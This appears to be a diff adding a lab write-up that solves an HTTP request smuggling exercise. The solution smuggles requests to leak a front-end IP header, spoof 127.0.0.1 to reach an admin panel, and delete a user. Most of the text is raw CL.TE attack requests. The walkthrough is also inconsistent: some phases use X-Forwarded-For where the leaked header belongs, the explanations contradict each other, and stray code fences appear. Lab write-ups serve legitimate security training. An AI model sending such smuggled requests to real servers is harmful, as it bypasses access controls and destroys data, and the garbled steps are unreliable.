@@ -1,0 +1,141 @@
+// Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting.
+
+
+This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
+
+There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name.
+
+To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.
+
+
+
+
+// Solution
+
+
+
+Phase 1 — Discover the Front-End Injection HeaderGoal: Make the back-end prepend the smuggled request to the next victim's request, so their body gets reflected back in an error response.
+
+// Attack request (CL.TE smuggle):
+
+POST / HTTP/1.1
+Host: <lab-host>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 122
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+X-Forwarded-For: 127.0.0.1
+
+x=
+
+
+How it works:
+
+The Transfer-Encoding: chunked body contains a single chunk of size 0, which terminates the chunked stream immediately.
+Everything after 0\r\n\r\n — the GET /admin ... fragment — is left in the back-end's TCP buffer.
+The Content-Length: 3 on the smuggled GET /admin tells the back-end to absorb 3 bytes of the next request's body (x= acts as a placeholder here).
+
+
+
+// Normal request immediately after (the "victim" request):
+
+POST / HTTP/1.1
+Host: <lab-host>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 9
+
+foo=bar
+```
+
+This normal request gets appended to the buffered `GET /admin ...`, and the combined request is processed by the back-end. The response will reflect the full HTTP headers of the normal request — including the **IP injection header** that the front-end added. In this lab, it is:
+```
+X-RDFaUe-Ip: <your-real-IP>
+
+
+
+
+Phase 2 — Leak the Header via Search Reflection
+To actually read the injected header, use a slightly different smuggle that routes the appended request into a search endpoint, which reflects user input back in the response body.
+
+
+// Attack request:
+
+POST / HTTP/1.1
+Host: <lab-host>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 107
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 159
+
+search=foobar
+
+
+
+// The Content-Length: 159 on the smuggled inner POST / is intentionally large. When the next victim request arrives, its headers get appended to search=foobar and the entire blob is processed as the search parameter — which the application echoes back, revealing the header name X-RDFaUe-Ip.
+
+Key detail: Content-Length: 159 must be large enough to capture the full incoming victim headers but not so large that the back-end times out waiting for more bytes. Adjust the value by a few bytes up/down if you don't see the leak on the first attempt.
+
+
+
+
+Phase 3 — Access the Admin Panel
+Now that you know the header name, smuggle a request to /admin spoofing the IP as 127.0.0.1:
+
+
+POST / HTTP/1.1
+Host: <lab-host>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 145
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+X-Forwarded-For: 127.0.0.1
+
+x=
+
+The back-end will process the smuggled GET /admin as if it originated from 127.0.0.1, granting access to the admin interface.
+
+
+
+
+Phase 4 — Delete User carlos
+Replace the path with the delete endpoint:
+
+
+POST / HTTP/1.1
+Host: <lab-host>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 145
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+X-RDFaUe-Ip: 127.0.0.1
+
+x=
+
+This causes the back-end to execute GET /admin/delete?username=carlos with the spoofed internal IP, completing the lab.
+
+
+
+
+video link:
+
+https://www.youtube.com/watch?v=gRIUDNZt_po
